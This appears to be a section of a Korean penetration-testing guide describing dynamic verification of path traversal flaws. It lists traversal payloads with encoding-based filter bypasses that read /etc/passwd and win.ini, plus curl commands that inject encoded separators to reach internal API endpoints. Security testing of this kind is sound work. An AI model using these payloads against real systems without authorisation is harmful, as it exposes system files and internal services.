### Phase 2: 동적 테스트 (검증)


**파일 시스템 Path Traversal 테스트:**
1. curl로 Path Traversal 페이로드가 포함된 요청을 전송
2. 응답에서 의도하지 않은 파일 내용이 반환되는지 확인

**파일 시스템 페이로드:**
- `../../../etc/passwd` — Linux 시스템 파일
- `..\..\..\..\windows\win.ini` — Windows 시스템 파일
- `....//....//....//etc/passwd` — 단순 `../` 필터 우회
- `..%2f..%2f..%2fetc/passwd` — URL 인코딩 우회
- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` — 전체 인코딩
- `..%252f..%252f..%252fetc/passwd` — 더블 인코딩 우회
- `....\/....\/etc/passwd` — 백슬래시 혼합
- `/etc/passwd` — 절대 경로 직접 접근

**안전한 확인 대상 파일:**
- `/etc/passwd` (읽기 전용, 민감 정보 없음)
- `/etc/hostname`
- `package.json`, `next.config.js` 등 프로젝트 파일
- 서버가 Windows인 경우: `C:\Windows\win.ini`

**내부 API Path Traversal 테스트:**
경로 파라미터에 URL 인코딩된 경로 구분자나 fragment를 삽입하여 내부 API의 다른 엔드포인트를 호출할 수 있는지 확인한다.

```
# 기본 테스트: %2f (URL 인코딩된 /)로 경로 삽입
curl "https://target.com/api/resource/abc%2f..%2fother-endpoint" -v

# fragment(#)로 뒤의 경로 무효화
curl "https://target.com/api/resource/abc%2fother-endpoint%23" -v

# 더블 인코딩: %252f
curl "https://target.com/api/resource/abc%252f..%252fother-endpoint" -v
```

소스코드에서 확인한 내부 API 경로 구조를 기반으로 실제로 존재하는 다른 엔드포인트의 응답이 반환되는지 확인한다.

**검증 기준:**
- **확인됨**: 동적 테스트로 의도하지 않은 파일이나 내부 API 응답이 반환된 것을 직접 확인함
